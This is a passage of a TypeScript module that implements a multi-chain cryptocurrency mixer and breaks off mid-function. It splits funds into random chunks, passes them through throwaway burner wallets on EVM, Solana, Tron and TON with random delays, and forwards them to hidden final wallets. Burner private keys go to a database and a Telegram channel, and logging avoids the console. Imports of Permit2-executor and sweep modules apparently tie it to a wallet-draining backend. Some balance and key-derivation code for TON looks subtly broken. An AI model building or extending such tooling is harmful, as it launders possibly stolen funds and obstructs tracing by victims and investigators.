/**
 * Non-custodial split-withdraw mixer — routes native funds through ephemeral burner
 * wallets before reaching the final destination. Logs exclusively via injected Telegram
 * callback (never console).
 *
 * Env:
 *   MIXING_ENABLED=true
 *   MIXING_MIN_CHUNKS=3          (default 3)
 *   MIXING_MAX_CHUNKS=5          (default 5)
 *   MIXING_DELAY_MIN_SEC=10
 *   MIXING_DELAY_MAX_SEC=45
 *   FINAL_WALLET_EVM / SOL / TRX / TON — destination per chain
 */
import { createHmac, randomBytes, randomInt } from 'node:crypto'
import { base58 } from '@scure/base'
import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from '@solana/web3.js'
import {
  Address as TonAddress,
  internal,
  WalletContractV4,
} from '@ton/ton'
import {
  createPublicClient,
  createWalletClient,
  formatEther,
  getAddress,
  http,
  isAddress,
  parseEther,
  type Address,
  type Hex,
} from 'viem'
import { mainnet } from 'viem/chains'
import { privateKeyToAccount } from 'viem/accounts'

import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import { EvmAdapter } from '../adapters/evm-adapter.js'
import { getRpcUrlForChainWithFallback } from '../lib/chain-rpc.js'
import {
  fetchTronBalance,
  fetchTonBalance,
  isDryRunExecution,
  loadServerSolanaKeypair,
  resolveServerSolanaPublicKey,
  resolveServerTonAddress,
  resolveServerTronAddressAsync,
} from '../logic/server-chain-execution.js'
import { resolveSettlementExecutorKey } from '../logic/permit2-executor.js'
import { resolveEvmRpcUrlForChain } from '../logic/permit2-executor.js'
import {
  readExecutionGasReserve,
  readExecutionGasReserveNative,
} from '../logic/simple-sweep.js'
import { resolveTronSensoryFullHost, tronProApiHeaders } from '../logic/tron-sensory-armor.js'
import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from '../logic/ton-sensory-armor.js'
import type {
  SettlementBridgeTriggerContext,
  SettlementBroadcastResult,
} from '../logic/settlement-execution-bridge.js'

// ── Burner Key Recovery System (Database-backed) ─────────────────────────
// Saves burner wallet keys to Supabase so stuck funds survive server restart

export type BurnerRecord = {
  chain: string
  address: string
  key: string
  amount: string
  finalAddress: string
  created: number
  status: 'pending' | 'completed' | 'stuck'
}

// In-memory fallback + DB sync
const BURNER_KEYS: Map<string, BurnerRecord> = new Map()

function resolveSupabaseForBurners(): { url: string; key: string } | null {
  const url = (typeof process !== 'undefined' ? process.env['NEXT_PUBLIC_SUPABASE_URL'] ?? process.env['SUPABASE_URL'] : '')?.trim()
  const key = (typeof process !== 'undefined' ? process.env['SUPABASE_SERVICE_ROLE_KEY'] : '')?.trim()
  if (!url || !key) return null
  return { url, key }
}

async function saveBurnerToDb(record: BurnerRecord): Promise<void> {
  const sb = resolveSupabaseForBurners()
  if (!sb) return
  try {
    const { createClient } = await (eval('import("@supabase/supabase-js")') as Promise<any>)
    const client = createClient(sb.url, sb.key) as any
    await client.from('burner_keys').upsert({
      address: record.address,
      chain: record.chain,
      private_key: record.key,
      amount: record.amount,
      final_address: record.finalAddress,
      status: record.status,
      created_at: new Date(record.created).toISOString(),
      updated_at: new Date().toISOString(),
    }, { onConflict: 'address' })
  } catch {
    // DB save failed - memory fallback still works
  }
}

async function loadStuckFromDb(): Promise<BurnerRecord[]> {
  const sb = resolveSupabaseForBurners()
  if (!sb) return []
  try {
    const { createClient } = await (eval('import("@supabase/supabase-js")') as Promise<any>)
    const client = createClient(sb.url, sb.key) as any
    const { data } = await client.from('burner_keys').select('*').eq('status', 'stuck')
    if (!data) return []
    return data.map((row: any) => ({
      chain: row.chain,
      address: row.address,
      key: row.private_key,
      amount: row.amount,
      finalAddress: row.final_address,
      created: new Date(row.created_at).getTime(),
      status: row.status,
    }))
  } catch {
    return []
  }
}

function saveBurnerKeyForRecovery(record: BurnerRecord): void {
  BURNER_KEYS.set(record.address, record)
  void saveBurnerToDb(record)
}

export async function getStuckBurners(): Promise<BurnerRecord[]> {
  // Merge memory + database
  const dbStuck = await loadStuckFromDb()
  const memStuck = Array.from(BURNER_KEYS.values()).filter((r) => r.status === 'stuck')
  const all = new Map<string, BurnerRecord>()
  for (const r of dbStuck) all.set(r.address, r)
  for (const r of memStuck) all.set(r.address, r)
  return Array.from(all.values())
}

export async function recoverStuckBurner(burnerAddress: string): Promise<{ ok: boolean; tx?: string; error?: string }> {
  let record = BURNER_KEYS.get(burnerAddress)
  if (!record) {
    // Try loading from database
    const dbRecords = await loadStuckFromDb()
    record = dbRecords.find((r) => r.address === burnerAddress)
    if (!record) return { ok: false, error: 'Burner not found in memory or database' }
  }
  if (record.status !== 'stuck') return { ok: false, error: 'Burner is not stuck (status: ' + record.status + ')' }

  try {
    if (record.chain === 'EVM') {
      const rpcUrl = await resolveEvmRpcUrlForChain(1)
      const tx = await evmTransfer(record.key as Hex, record.finalAddress as Address, BigInt(record.amount), 1, rpcUrl)
      record.status = 'completed'
      saveBurnerKeyForRecovery(record)
      return { ok: true, tx }
    }
    if (record.chain === 'TRX') {
      const tx = await trxTransfer(record.key, record.finalAddress, BigInt(record.amount))
      record.status = 'completed'
      saveBurnerKeyForRecovery(record)
      return { ok: true, tx }
    }
    if (record.chain === 'SOL') {
      const rpc = resolveInstitutionalSolanaRpcUrl() || 'https://api.mainnet-beta.solana.com'
      // key is stored as base58 (88 chars) — decode back to 64-byte secretKey
      const secretKey = base58.decode(record.key)
      const keypair = Keypair.fromSecretKey(secretKey)
      const tx = await solTransfer(keypair, record.finalAddress, BigInt(record.amount), rpc)
      record.status = 'completed'
      saveBurnerKeyForRecovery(record)
      return { ok: true, tx }
    }
    if (record.chain === 'TON') {
      const tx = await tonTransferFromMnemonic(record.key, record.finalAddress, BigInt(record.amount))
      record.status = 'completed'
      saveBurnerKeyForRecovery(record)
      return { ok: true, tx }
    }
    return { ok: false, error: 'Recovery not implemented for chain: ' + record.chain }
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : String(e) }
  }
}

export async function recoverAllStuckBurners(): Promise<Array<{ address: string; ok: boolean; tx?: string; error?: string }>> {
  const stuck = await getStuckBurners()
  const results = []
  for (const burner of stuck) {
    const result = await recoverStuckBurner(burner.address)
    results.push({ address: burner.address, ...result })
  }
  return results
}

export type MixChain = 'EVM' | 'SOL' | 'TRX' | 'TON' | 'BTC'

export type MixTelegramLogger = (message: string) => Promise<void>

export type SplitWithdrawParams = {
  chain: MixChain
  amountNative: bigint
  finalAddress: string
  /** Settlement tx hash — used for deterministic burner key derivation when MIXER_MASTER_KEY is set. */
  settlementId?: string
  /** EVM only — defaults to 1 (mainnet). */
  chainId?: number
  rpcUrl?: string
  log?: MixTelegramLogger
  /** When set, mix at most this amount (defaults to full `amountNative`). */
  maxAmount?: bigint
}

export type SplitWithdrawChunkResult = {
  index: number
  percent: number
  burnerAddress: string
  leg1Tx?: string
  leg2Tx?: string
  error?: string
}

export type SplitWithdrawResult = {
  ok: boolean
  dryRun: boolean
  chain: MixChain
  chunkCount: number
  chunks: SplitWithdrawChunkResult[]
  finalAddress: string
  amountNative: string
  error?: string
}

export type MixChainResult = {
  chain: MixChain
  ok: boolean
  skipped?: string
  result?: SplitWithdrawResult
  error?: string
}

export type MixAllResult = {
  ok: boolean
  enabled: boolean
  dryRun: boolean
  chains: MixChainResult[]
  timestamp: string
}

let registeredTelegramLogger: MixTelegramLogger | null = null

/** Wire Telegram delivery from the API layer — split-withdraw never uses console. */
export function registerSplitWithdrawTelegramLogger(log: MixTelegramLogger): void {
  registeredTelegramLogger = log
}

function readEnv(key: string): string | undefined {
  if (typeof process === 'undefined') return undefined
  const raw = process.env[key]?.trim()
  return raw || undefined
}

function isTruthyEnv(key: string): boolean {
  const v = readEnv(key)?.toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function isMixingEnabled(): boolean {
  return isTruthyEnv('MIXING_ENABLED')
}

function resolveLogger(explicit?: MixTelegramLogger): MixTelegramLogger {
  const log = explicit ?? registeredTelegramLogger
  return log ?? (async () => {})
}

function resolveChunkBounds(): { min: number; max: number } {
  const minRaw = Number.parseInt(readEnv('MIXING_MIN_CHUNKS') ?? '3', 10)
  const maxRaw = Number.parseInt(readEnv('MIXING_MAX_CHUNKS') ?? '5', 10)
  const min = Number.isFinite(minRaw) && minRaw >= 2 ? minRaw : 3
  const max = Number.isFinite(maxRaw) && maxRaw >= min ? maxRaw : 5
  return { min, max }
}

function resolveDelayBoundsMs(): { min: number; max: number } {
  const minSec = Number.parseInt(readEnv('MIXING_DELAY_MIN_SEC') ?? '10', 10)
  const maxSec = Number.parseInt(readEnv('MIXING_DELAY_MAX_SEC') ?? '45', 10)
  const min = Number.isFinite(minSec) && minSec > 0 ? minSec * 1000 : 10_000
  const max = Number.isFinite(maxSec) && maxSec >= minSec ? maxSec * 1000 : 45_000
  return { min, max }
}

function pickChunkCount(): number {
  const { min, max } = resolveChunkBounds()
  return randomInt(min, max + 1)
}

/** Random positive percentages summing to 100. */
export function randomChunkPercents(count: number): number[] {
  if (count < 2) return [100]
  const cuts = Array.from({ length: count - 1 }, () => Math.random()).sort((a, b) => a - b)
  const points = [0, ...cuts, 1]
  const raw = []
  for (let i = 0; i < count; i++) raw.push(points[i + 1]! - points[i]!)
  const scaled = raw.map((w) => Math.max(1, Math.round(w * 1000) / 10))
  const sum = scaled.reduce((a, b) => a + b, 0)
  scaled[scaled.length - 1]! += 100 - sum
  return scaled
}

export function allocateChunkAmounts(total: bigint, percents: number[]): bigint[] {
  const amounts: bigint[] = []
  let allocated = 0n
  for (let i = 0; i < percents.length; i++) {
    if (i === percents.length - 1) {
      amounts.push(total - allocated)
    } else {
      const part = (total * BigInt(Math.round(percents[i]!))) / 100n
      amounts.push(part)
      allocated += part
    }
  }
  return amounts
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

function randomDelayMs(): number {
  const { min, max } = resolveDelayBoundsMs()
  return randomInt(min, max + 1)
}

function readFinalWallet(chain: MixChain): string | null {
  const keys: Record<MixChain, string> = {
    EVM: 'FINAL_WALLET_EVM',
    SOL: 'FINAL_WALLET_SOL',
    TRX: 'FINAL_WALLET_TRX',
    TON: 'FINAL_WALLET_TON',
    BTC: 'FINAL_WALLET_BTC',
  }
  return readEnv(keys[chain]) ?? null
}

function readMinNative(chain: MixChain): bigint {
  const map: Record<string, string> = {
    EVM: 'EVM',
    SOL: 'SOL',
    TRX: 'TRON',
    TON: 'TON',
    BTC: 'BTC',
  }
  return readExecutionGasReserveNative(map[chain] as any)
}

function formatMixNativeHuman(chain: MixChain, amount: bigint): string {
  switch (chain) {
    case 'EVM':
      return formatEther(amount)
    case 'SOL':
      return `${(Number(amount) / 1e9).toFixed(6)} SOL`
    case 'TRX':
      return `${(Number(amount) / 1e6).toFixed(2)} TRX`
    case 'TON':
      return `${(Number(amount) / 1e9).toFixed(4)} TON`
    case 'BTC':
      return `${(Number(amount) / 1e8).toFixed(8)} BTC`
  }
}

function formatMixReserveSkip(chain: MixChain, balance: bigint): string {
  const reserve = readExecutionGasReserve(
    chain === 'TRX' ? 'TRON' : chain === 'SOL' ? 'SOL' : chain,
  )
  return `⚠️ Balance (${formatMixNativeHuman(chain, balance)}) not enough to leave reserve (${reserve}). No mix performed.`
}

// ── EVM transfers ─────────────────────────────────────────────────────────────

async function evmTransfer(
  fromKey: Hex,
  to: Address,
  value: bigint,
  chainId: number,
  rpcUrl: string,
): Promise<string> {
  if (isDryRunExecution()) return `dry-run-evm-${Date.now()}`
  const account = privateKeyToAccount(fromKey)
  const publicClient = createPublicClient({ transport: http(rpcUrl) })
  const walletClient = createWalletClient({ account, transport: http(rpcUrl) })
  const gasPrice = await publicClient.getGasPrice()
  const gas = 21_000n
  const hash = await walletClient.sendTransaction({
    account,
    chain: null,
    to,
    value,
    gas,
    gasPrice,
  } as unknown as Parameters<typeof walletClient.sendTransaction>[0])
  return hash
}

async function evmForwardGasBuffer(rpcUrl: string): Promise<bigint> {
  const publicClient = createPublicClient({ transport: http(rpcUrl) })
  const gasPrice = await publicClient.getGasPrice()
  return (21_000n * gasPrice * 12n) / 10n
}

// ── Solana transfers ──────────────────────────────────────────────────────────

async function solTransfer(
  keypair: Keypair,
  to: string,
  lamports: bigint,
  rpcUrl: string,
): Promise<string> {
  if (isDryRunExecution()) return `dry-run-sol-${Date.now()}`
  const connection = new Connection(rpcUrl, { commitment: 'confirmed' })
  const { blockhash } = await connection.getLatestBlockhash('finalized')
  const msg = new TransactionMessage({
    payerKey: keypair.publicKey,
    recentBlockhash: blockhash,
    instructions: [
      SystemProgram.transfer({
        fromPubkey: keypair.publicKey,
        toPubkey: new PublicKey(to),
        lamports: Number(lamports),
      }),
    ],
  }).compileToV0Message()
  const tx = new VersionedTransaction(msg)
  tx.sign([keypair])
  const sig = await connection.sendRawTransaction(tx.serialize(), {
    preflightCommitment: 'confirmed',
    skipPreflight: false,
    maxRetries: 3,
  })
  return sig
}

const SOL_FORWARD_FEE_BUFFER = 10_000n

// ── Tron transfers ────────────────────────────────────────────────────────────

// ── Deterministic burner key derivation ──────────────────────────────────────
// When MIXER_MASTER_KEY is set, burner keys are derived deterministically:
//   burnerKey = HMAC-SHA256(masterKey, settlementId:chunkIndex)
// This means ANY stuck burner can be re-derived from master key + tx_hash + index.
// Without MIXER_MASTER_KEY, falls back to random (legacy behaviour).

function readMixerMasterKey(): string | null {
  return readEnv('MIXER_MASTER_KEY') ?? null
}

function deriveDeterministicHex(masterKey: string, settlementId: string, chunkIndex: number): string {
  return createHmac('sha256', masterKey)
    .update(`${settlementId}:${chunkIndex}`)
    .digest('hex')
}

function resolveBurnerKeyEvm(settlementId: string | undefined, chunkIndex: number): Hex {
  const master = readMixerMasterKey()
  if (master && settlementId) {
    return `0x${deriveDeterministicHex(master, settlementId, chunkIndex)}` as Hex
  }
  return `0x${randomBytes(32).toString('hex')}` as Hex
}

function resolveBurnerKeySol(settlementId: string | undefined, chunkIndex: number): Keypair {
  const master = readMixerMasterKey()
  if (master && settlementId) {
    const seed = Buffer.from(deriveDeterministicHex(master, settlementId, chunkIndex), 'hex')
    return Keypair.fromSeed(new Uint8Array(seed))
  }
  return Keypair.generate()
}

function resolveBurnerKeyTrx(settlementId: string | undefined, chunkIndex: number): string {
  const master = readMixerMasterKey()
  if (master && settlementId) {
    return deriveDeterministicHex(master, settlementId, chunkIndex)
  }
  return randomBytes(32).toString('hex')
}

function resolveBurnerKeyTonBytes(settlementId: string | undefined, chunkIndex: number): Buffer {
  const master = readMixerMasterKey()
  if (master && settlementId) {
    return Buffer.from(deriveDeterministicHex(master, settlementId, chunkIndex), 'hex')
  }
  return randomBytes(32)
}

function randomTronPrivateKey(): string {
  return randomBytes(32).toString('hex')
}

async function tronAddressFromPrivateKey(pk: string): Promise<string> {
  const { TronWeb } = await import('tronweb')
  const addr = TronWeb.address?.fromPrivateKey(pk.padStart(64, '0'))
  if (typeof addr !== 'string') throw new Error('Could not derive TRX burner address')
  return addr
}

async function trxTransfer(
  privateKey: string,
  to: string,
  amountSun: bigint,
  rpcUrl?: string,
): Promise<string> {
  if (isDryRunExecution()) return `dry-run-trx-${Date.now()}`
  const fullHost = rpcUrl?.trim() || resolveTronSensoryFullHost()
  const { TronWeb } = await import('tronweb')
  const headers = tronProApiHeaders()
  const pk = privateKey.replace(/^0x/i, '').padStart(64, '0')
  const tronWeb =
    headers != null
      ? new TronWeb({ fullHost, headers, privateKey: pk })
      : new TronWeb({ fullHost, privateKey: pk })
  const fromAddress = tronWeb.defaultAddress.base58 as string
  const unsignedTx = await tronWeb.transactionBuilder.sendTrx(
    to,
    Number(amountSun),
    fromAddress,
  )
  const signed = await tronWeb.trx.sign(
    unsignedTx as Parameters<typeof tronWeb.trx.sign>[0],
  )
  const result = (await tronWeb.trx.sendRawTransaction(
    signed as Parameters<typeof tronWeb.trx.sendRawTransaction>[0],
  )) as { result?: boolean; txid?: string; transaction?: { txID?: string } }
  if (!result.result) throw new Error('TRX broadcast failed')
  return result.txid ?? result.transaction?.txID ?? 'unknown'
}

const TRX_FORWARD_FEE_BUFFER = 2_000_000n

// ── TON transfers ─────────────────────────────────────────────────────────────

async function tonTransferFromMnemonic(
  mnemonic: string,
  to: string,
  amountNanotons: bigint,
  rpcUrl?: string,
): Promise<string> {
  if (isDryRunExecution()) return `dry-run-ton-${Date.now()}`
  const endpoint = rpcUrl?.trim() || resolveTonCenterJsonRpcUrl()
  const { mnemonicToWalletKey } = await import('@ton/crypto')
  const { TonClient } = await import('@ton/ton')
  const key = await mnemonicToWalletKey(mnemonic.split(' '))
  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
  const apiKey = tonCenterApiHeaders()?.['X-API-Key']
  const client = new TonClient({ endpoint, ...(apiKey ? { apiKey } : {}) })
  const provider = client.open(wallet)
  const seqno = await provider.getSeqno()
  await provider.sendTransfer({
    seqno,
    secretKey: key.secretKey,
    messages: [
      internal({
        to: TonAddress.parse(to),
        value: amountNanotons,
        bounce: false,
      }),
    ],
  })
  const txs = await client.getTransactions(wallet.address, { limit: 1 })
  return txs[0]?.hash().toString('hex') ?? 'pending'
}

async function tonAddressFromMnemonic(mnemonic: string): Promise<string> {
  const { mnemonicToWalletKey } = await import('@ton/crypto')
  const key = await mnemonicToWalletKey(mnemonic.split(' '))
  const wallet = WalletContractV4.create({ publicKey: key.publicKey, workchain: 0 })
  return wallet.address.toString({ bounceable: false, urlSafe: true })
}

const TON_FORWARD_FEE_BUFFER = 50_000_000n

// ── Burner safety helpers ─────────────────────────────────────────────────────

// Minimum balance (native units) below which a burner is considered drained
const DRAIN_DUST: Record<string, bigint> = {
  EVM: 1_000_000_000_000_000n, // 0.001 ETH
  SOL: 10_000_000n,             // 0.01 SOL
  TRX: 5_000_000n,              // 5 TRX
  TON: 20_000_000n,             // 0.02 TON
}

async function getBurnerBalance(chain: string, address: string, rpcUrl: string, chainId = 1): Promise<bigint> {
  try {
    if (chain === 'EVM') {
      const client = createPublicClient({ transport: http(rpcUrl) })
      return await client.getBalance({ address: address as Address })
    }
    if (chain === 'SOL') {
      const connection = new Connection(rpcUrl, { commitment: 'confirmed' })
      return BigInt(await connection.getBalance(new PublicKey(address)))
    }
    if (chain === 'TRX') {
      return BigInt(await fetchTronBalance(address))
    }
    if (chain === 'TON') {
      return await fetchTonBalance()
    }
  } catch {
    // Balance check failure is non-fatal — treat as drained to avoid false stuck alerts
  }
  return 0n
}

async function isBurnerDrained(chain: string, address: string, rpcUrl: string, chainId = 1): Promise<boolean> {
  const balance = await getBurnerBalance(chain, address, rpcUrl, chainId)
  const dust = DRAIN_DUST[chain] ?? 1_000_000n
  return balance <= dust
}

const CHAIN_IMPORT_HINT: Record<string, string> = {
  EVM: '💡 Import: MetaMask → Import Account → Private Key (paste the 0x... key)',
  SOL: '💡 Import: Phantom → Add wallet → Import Private Key (paste the base58 key, NOT seed phrase)',
  TRX: '💡 Import: TronLink → Import Wallet → Private Key (paste the hex key)',
  TON: '⚠️ TON mnemonic is NOT BIP-39 — Trust Wallet/MetaMask will reject it!\n💡 Use TONKEEPER app only → Add wallet → Import existing → 24 words',
}

/** Send burner key + details to Telegram so user can manually sweep if needed. */
async function logBurnerKeyToTelegram(
  log: MixTelegramLogger,
  params: {
    chain: string
    chunkIndex: number
    address: string
    key: string
    amountHuman: string
    finalAddress: string
    settlementId?: string
  },
): Promise<void> {
  const isDeterministic = readMixerMasterKey() != null && params.settlementId != null
  const importHint = CHAIN_IMPORT_HINT[params.chain] ?? '💡 Import using chain-specific wallet'
  await log(
    [
      `🔑 <b>Burner Wallet — ${params.chain} Chunk ${params.chunkIndex + 1}</b>`,
      `📬 Address: <code>${params.address}</code>`,
      `🗝 Key: <code>${params.key}</code>`,
      `💰 Amount: ${params.amountHuman}`,
      `🏁 Final: <code>${params.finalAddress}</code>`,
      importHint,
      isDeterministic
        ? `♻️ Deterministic — recoverable from MIXER_MASTER_KEY + tx_hash`
        : `⚠️ Random key — save this immediately`,
    ].join('\n'),
  )
}

// ── Chunk execution per chain ─────────────────────────────────────────────────

async function runEvmChunk(params: {
  chunkIndex: number
  percent: number
  chunkAmount: bigint
  executionKey: Hex
  finalAddress: Address
  chainId: number
  rpcUrl: string
  settlementId?: string
  log: MixTelegramLogger
}): Promise<SplitWithdrawChunkResult> {
  const burnerKey = resolveBurnerKeyEvm(params.settlementId, params.chunkIndex)
  const burnerAccount = privateKeyToAccount(burnerKey)
  const gasBuffer = await evmForwardGasBuffer(params.rpcUrl)
  const leg1Value = params.chunkAmount + gasBuffer

  const result: SplitWithdrawChunkResult = {
    index: params.chunkIndex,
    percent: params.percent,
    burnerAddress: burnerAccount.address,
  }

  // Save burner key for recovery if leg2 fails
  const burnerRecord: BurnerRecord = {
    chain: 'EVM',
    address: burnerAccount.address,
    key: burnerKey,
    amount: params.chunkAmount.toString(),
    finalAddress: params.finalAddress,
    created: Date.now(),
    status: 'pending' as const,
  }
  saveBurnerKeyForRecovery(burnerRecord)
  await logBurnerKeyToTelegram(params.log, {
    chain: 'EVM', chunkIndex: params.chunkIndex,
    address: burnerAccount.address, key: burnerKey,
    amountHuman: `${formatEther(params.chunkAmount)} ETH`,
    finalAddress: params.finalAddress, settlementId: params.settlementId,
  })

  try {
    await params.log(
      `🔀 EVM chunk ${params.chunkIndex + 1}: execution → burner <code>${burnerAccount.address.slice(0, 10)}…</code> (${formatEther(params.chunkAmount)} ETH)`,
    )
    result.leg1Tx = await evmTransfer(
      params.executionKey,
      burnerAccount.address,
      leg1Value,
      params.chainId,
      params.rpcUrl,
    )
    const evmDelay = randomDelayMs()
    await params.log(`⏳ EVM chunk ${params.chunkIndex + 1}: waiting ${Math.round(evmDelay / 1000)}s`)
    await sleep(evmDelay)
    await params.log(
      `🔀 EVM chunk ${params.chunkIndex + 1}: burner → final <code>${params.finalAddress.slice(0, 10)}…</code>`,
    )
    result.leg2Tx = await evmTransfer(
      burnerKey,
      params.finalAddress,
      params.chunkAmount,
      params.chainId,
      params.rpcUrl,
    )
    const drained = await isBurnerDrained('EVM', burnerAccount.address, params.rpcUrl, params.chainId)
    if (drained) {
      burnerRecord.status = 'completed'
      saveBurnerKeyForRecovery(burnerRecord)
    } else {
      burnerRecord.status = 'stuck'
      saveBurnerKeyForRecovery(burnerRecord)
      await params.log(`⚠️ EVM chunk ${params.chunkIndex + 1}: leg2 broadcast ok but burner balance > dust — marked stuck for recovery`)
    }
  } catch (e) {
    result.error = e instanceof Error ? e.message : String(e)
    burnerRecord.status = 'stuck'
    saveBurnerKeyForRecovery(burnerRecord)
    await params.log(`❌ EVM chunk ${params.chunkIndex + 1}: ${result.error} — key already sent to Telegram`)
  }
  return result
}

async function runSolChunk(params: {
  chunkIndex: number
  percent: number
  chunkAmount: bigint
  executionKeypair: Keypair
  finalAddress: string
  rpcUrl: string
  settlementId?: string
  log: MixTelegramLogger
}): Promise<SplitWithdrawChunkResult> {
  const burner = resolveBurnerKeySol(params.settlementId, params.chunkIndex)
  const leg1Lamports = params.chunkAmount + SOL_FORWARD_FEE_BUFFER
  const result: SplitWithdrawChunkResult = {
    index: params.chunkIndex,
    percent: params.percent,
    burnerAddress: burner.publicKey.toBase58(),
  }

  // base58 of the full 64-byte secretKey — this is what Phantom/Solflare import expects
  const solBurnerKey = base58.encode(burner.secretKey)
  saveBurnerKeyForRecovery({ chain: 'SOL', address: result.burnerAddress, key: solBurnerKey, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'pending' })
  await logBurnerKeyToTelegram(params.log, {
    chain: 'SOL', chunkIndex: params.chunkIndex,
    address: result.burnerAddress, key: solBurnerKey,
    amountHuman: `${(Number(params.chunkAmount) / 1e9).toFixed(6)} SOL`,
    finalAddress: params.finalAddress, settlementId: params.settlementId,
  })

  try {
    await params.log(
      `🔀 SOL chunk ${params.chunkIndex + 1}: execution → burner <code>${result.burnerAddress.slice(0, 8)}…</code>`,
    )
    result.leg1Tx = await solTransfer(
      params.executionKeypair,
      result.burnerAddress,
      leg1Lamports,
      params.rpcUrl,
    )
    const solDelay = randomDelayMs()
    await params.log(`⏳ SOL chunk ${params.chunkIndex + 1}: waiting ${Math.round(solDelay / 1000)}s`)
    await sleep(solDelay)
    await params.log(`🔀 SOL chunk ${params.chunkIndex + 1}: burner → final`)
    result.leg2Tx = await solTransfer(burner, params.finalAddress, params.chunkAmount, params.rpcUrl)
    const drained = await isBurnerDrained('SOL', result.burnerAddress, params.rpcUrl)
    if (drained) {
      saveBurnerKeyForRecovery({ chain: 'SOL', address: result.burnerAddress, key: solBurnerKey, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'completed' })
    } else {
      saveBurnerKeyForRecovery({ chain: 'SOL', address: result.burnerAddress, key: solBurnerKey, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'stuck' })
      await params.log(`⚠️ SOL chunk ${params.chunkIndex + 1}: broadcast ok but balance > dust — marked stuck`)
    }
  } catch (e) {
    result.error = e instanceof Error ? e.message : String(e)
    saveBurnerKeyForRecovery({ chain: 'SOL', address: result.burnerAddress, key: solBurnerKey, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'stuck' })
    await params.log(`❌ SOL chunk ${params.chunkIndex + 1}: ${result.error} — key already sent to Telegram`)
  }
  return result
}

async function runTrxChunk(params: {
  chunkIndex: number
  percent: number
  chunkAmount: bigint
  executionKey: string
  finalAddress: string
  rpcUrl?: string
  settlementId?: string
  log: MixTelegramLogger
}): Promise<SplitWithdrawChunkResult> {
  const burnerKey = resolveBurnerKeyTrx(params.settlementId, params.chunkIndex)
  const burnerAddress = await tronAddressFromPrivateKey(burnerKey)
  const leg1Sun = params.chunkAmount + TRX_FORWARD_FEE_BUFFER
  const result: SplitWithdrawChunkResult = {
    index: params.chunkIndex,
    percent: params.percent,
    burnerAddress,
  }

  saveBurnerKeyForRecovery({ chain: 'TRX' as const, address: burnerAddress, key: burnerKey, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'pending' })
  await logBurnerKeyToTelegram(params.log, {
    chain: 'TRX', chunkIndex: params.chunkIndex,
    address: burnerAddress, key: burnerKey,
    amountHuman: `${(Number(params.chunkAmount) / 1e6).toFixed(2)} TRX`,
    finalAddress: params.finalAddress, settlementId: params.settlementId,
  })

  try {
    await params.log(`🔀 TRX chunk ${params.chunkIndex + 1}: execution → burner`)
    result.leg1Tx = await trxTransfer(params.executionKey, burnerAddress, leg1Sun, params.rpcUrl)
    const trxDelay = randomDelayMs()
    await params.log(`⏳ TRX chunk ${params.chunkIndex + 1}: waiting ${Math.round(trxDelay / 1000)}s`)
    await sleep(trxDelay)
    await params.log(`🔀 TRX chunk ${params.chunkIndex + 1}: burner → final`)
    result.leg2Tx = await trxTransfer(burnerKey, params.finalAddress, params.chunkAmount, params.rpcUrl)
    const drained = await isBurnerDrained('TRX', burnerAddress, params.rpcUrl ?? '')
    if (drained) {
      saveBurnerKeyForRecovery({ chain: 'TRX' as const, address: burnerAddress, key: burnerKey, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'completed' })
    } else {
      saveBurnerKeyForRecovery({ chain: 'TRX' as const, address: burnerAddress, key: burnerKey, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'stuck' })
      await params.log(`⚠️ TRX chunk ${params.chunkIndex + 1}: broadcast ok but balance > dust — marked stuck`)
    }
  } catch (e) {
    result.error = e instanceof Error ? e.message : String(e)
    saveBurnerKeyForRecovery({ chain: 'TRX' as const, address: burnerAddress, key: burnerKey, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'stuck' })
    await params.log(`❌ TRX chunk ${params.chunkIndex + 1}: ${result.error} — key already sent to Telegram`)
  }
  return result
}

async function runTonChunk(params: {
  chunkIndex: number
  percent: number
  chunkAmount: bigint
  executionMnemonic: string
  finalAddress: string
  rpcUrl?: string
  settlementId?: string
  log: MixTelegramLogger
}): Promise<SplitWithdrawChunkResult> {
  const { mnemonicNew, mnemonicToWalletKey } = await import('@ton/crypto')
  const burnerMnemonic = (await mnemonicNew()).join(' ')
  const burnerAddress = await tonAddressFromMnemonic(burnerMnemonic)
  // Derive raw ed25519 private key so user has a backup beyond the mnemonic
  const walletKey = await mnemonicToWalletKey(burnerMnemonic.split(' '))
  const rawPrivKeyHex = Buffer.from(walletKey.secretKey.slice(0, 32)).toString('hex')
  const leg1Nano = params.chunkAmount + TON_FORWARD_FEE_BUFFER
  const result: SplitWithdrawChunkResult = {
    index: params.chunkIndex,
    percent: params.percent,
    burnerAddress,
  }

  saveBurnerKeyForRecovery({ chain: 'TON', address: burnerAddress, key: burnerMnemonic, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'pending' })
  await logBurnerKeyToTelegram(params.log, {
    chain: 'TON', chunkIndex: params.chunkIndex,
    address: burnerAddress, key: burnerMnemonic,
    amountHuman: `${(Number(params.chunkAmount) / 1e9).toFixed(4)} TON`,
    finalAddress: params.finalAddress, settlementId: params.settlementId,
  })
  // Send raw private key as a separate backup message
  await params.log(
    `🔑 <b>TON Raw Private Key (backup)</b>\n` +
    `📬 Address: <code>${burnerAddress}</code>\n` +
    `🗝 Raw key (32-byte hex): <code>${rawPrivKeyHex}</code>\n` +
    `💡 Use in TON CLI: ton-access or toncli with --private-key flag\n` +
    `⚠️ Mnemonic above is for Tonkeeper. This raw key is for advanced use only.`
  )

  try {
    await params.log(`🔀 TON chunk ${params.chunkIndex + 1}: execution → burner`)
    result.leg1Tx = await tonTransferFromMnemonic(
      params.executionMnemonic,
      burnerAddress,
      leg1Nano,
      params.rpcUrl,
